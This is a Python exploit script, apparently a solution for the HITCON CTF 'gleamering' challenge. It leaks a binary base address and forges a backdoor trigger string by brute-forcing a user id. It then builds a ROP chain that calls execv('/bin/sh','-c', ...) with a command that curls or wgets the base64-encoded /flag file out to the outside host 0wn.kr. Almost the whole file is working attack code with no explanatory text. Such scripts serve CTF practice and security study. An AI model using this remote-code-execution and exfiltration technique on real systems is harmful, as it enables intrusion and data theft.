from requests import Session
from os import urandom
from pwn import u64, xor, p64
import base64

HOST = 'http://localhost:1337'
# HOST = 'http://gleamering.chal.hitconctf.com:30482'
# HOST = 'http://gleamering.chal.hitconctf.com:30482'
h = {'Content-Type': 'application/x-www-form-urlencoded'}

x = urandom(8).hex()
s1 = Session()
d = {
    'user': x,
    'pass': 'a',
    'id': '1',
}

print(x)
s1.post(f'{HOST}/signup', headers=h, data=d)

# c = s1.post(f'{HOST}/posts', headers=h, data={'content': '$b4cKd0Or|' + 'A'*100})

usermult = 0xDEADBEEF
msgmult = 0xCAFEBABE

user_id = 1
msg_id = 1
key = 2099777860903446
# key = 100000009


# lol = 'A'*0x5000
lol = '$b4cKd0Or|'
c = s1.post(f'{HOST}/posts', headers=h, data={'content': ''})
post_id = c.content.split(b'hx-get="/posts/')[1].split(b'"')[0].decode()
print('post_id', post_id)

c = s1.patch(f'{HOST}/posts/{post_id}', headers=h)
leak = base64.b64decode(c.content.split(b'value="')[1].split(b'"')[0].decode())
binary = u64(leak) - 0x465d10
print('fuck', hex(binary))

import string
import random

while True:
    user_id = random.randint(1, 0xffffffffff)
    k = user_id * usermult + (int(post_id)+1) * msgmult + key * user_id

    from pwn import xor
    from hashlib import sha512
    lol2 = xor(sha512((k).to_bytes(16, 'big')).digest(), lol)[:len(lol)].decode('latin-1')

    if all(c in string.printable for c in lol2):
        print('K', k)
        print(user_id, lol2)
        print(sha512((k).to_bytes(16, 'big')).hexdigest())
        print(lol2.encode().hex())
        print("yeah")
        break

# resignup
x = urandom(8).hex()
d = {
    'user': x,
    'pass': 'a',
    'id': str(user_id),
}
s1.post(f'{HOST}/signup', headers=h, data=d)


import base64
# CHANGE ME
payload = b''
target = b'/bin/sh\x00'

payload += p64(binary + 0x52becf)    # pop rdi
payload += p64(binary + 0x0000000000A16AA0) # bss
payload += p64(binary + 0x4fe725)    # pop rsi
payload += b'/bin\x00\x00\x00\x00'
payload += p64(binary+0x40860f)    # mov [rdi], esi

payload += p64(binary + 0x52becf)    # pop rdi
payload += p64(binary + 0x0000000000A16AA0 + 4) # bss
payload += p64(binary + 0x4fe725)    # pop rsi
payload += b'/sh\x00\x00\x00\x00\x00'
payload += p64(binary+0x40860f)    # mov [rdi], esi


target = b'-c\x00\x00'

payload += p64(binary + 0x52becf)    # pop rdi
payload += p64(binary + 0x0000000000A16AA0 + 0x10) # bss
payload += p64(binary + 0x4fe725)    # pop rsi
payload += target + b'\x00\x00\x00\x00'
payload += p64(binary+0x40860f)    # mov [rdi], esi



target = b'curl http://0wn.kr?`cat /flag|base64 -w0`;\x00'.ljust(68, b'\x00')
for i in range(0, len(target), 4):
    payload += p64(binary + 0x52becf)    # pop rdi
    payload += p64(binary + 0x0000000000A16AA0 + 0x20 + i) # bss
    payload += p64(binary + 0x4fe725)    # pop rsi
    payload += target[i:i+4] + b'\x00\x00\x00\x00'
    payload += p64(binary+0x40860f)    # mov [rdi], esi

target = p64(binary +0x0000000000A16AA0 + 0x10) # -c (argv0)

payload += p64(binary + 0x52becf)    # pop rdi
payload += p64(binary + 0x0000000000A16A00 + 0x28 + 0) # bss
payload += p64(binary + 0x4fe725)    # pop rsi
payload += target[0:4] + b'\x00\x00\x00\x00'
payload += p64(binary+0x40860f)    # mov [rdi], esi

payload += p64(binary + 0x52becf)    # pop rdi
payload += p64(binary + 0x0000000000A16A00 + 0x28 + 4) # bss
payload += p64(binary + 0x4fe725)    # pop rsi
payload += target[4:8] + b'\x00\x00\x00\x00'
payload += p64(binary+0x40860f)    # mov [rdi], esi

target = p64(binary+ 0x0000000000A16AA0 + 0x10) # -c

payload += p64(binary + 0x52becf)    # pop rdi
payload += p64(binary + 0x0000000000A16A00 + 0x30 + 0) # bss
payload += p64(binary + 0x4fe725)    # pop rsi
payload += target[0:4] + b'\x00\x00\x00\x00'
payload += p64(binary+0x40860f)    # mov [rdi], esi

payload += p64(binary + 0x52becf)    # pop rdi
payload += p64(binary + 0x0000000000A16A00 + 0x30 + 4) # bss
payload += p64(binary + 0x4fe725)    # pop rsi
payload += target[4:8] + b'\x00\x00\x00\x00'
payload += p64(binary+0x40860f)    # mov [rdi], esi


target = p64(binary+ 0x0000000000A16AA0 + 0x20) # curl

payload += p64(binary + 0x52becf)    # pop rdi
payload += p64(binary + 0x0000000000A16A00 + 0x38 + 0) # bss
payload += p64(binary + 0x4fe725)    # pop rsi
payload += target[0:4] + b'\x00\x00\x00\x00'
payload += p64(binary+0x40860f)    # mov [rdi], esi

payload += p64(binary + 0x52becf)    # pop rdi
payload += p64(binary + 0x0000000000A16A00 + 0x38 + 4) # bss
payload += p64(binary + 0x4fe725)    # pop rsi
payload += target[4:8] + b'\x00\x00\x00\x00'
payload += p64(binary+0x40860f)    # mov [rdi], esi


payload += p64(binary + 0x52becf)    # pop rdi
payload += p64(binary + 0x0000000000A16AA0)    # /bin/sh addr

payload += p64(binary + 0x4fe725)    # pop rsi
payload += p64(binary + 0x0000000000A16A00 + 0x28)    # args

payload += p64(binary + 0x00000000002008C0) # execv



payload = lol2 + ("41 ; cat /flag | wget http://0wn.kr/?`cat /flag|base64 -w0`;").rjust((0xd8-10)*2,"1")+ '42'*5 + payload.hex()
print("GO", payload)
print('argv', hex(binary + 0x0000000000A16AA0))
# payload = lol2 + '41'*(0xe0-0x20-5) + '42'*6 + '00'*2
print(lol2)
c = s1.post(f'{HOST}/posts', headers=h, data={'content': payload})
post_id = c.content.split(b'hx-get="/posts/')[1].split(b'"')[0].decode()
print('post_id', post_id)

# encrypt
c = s1.patch(f'{HOST}/posts/{post_id}', headers=h)
print(c.content)
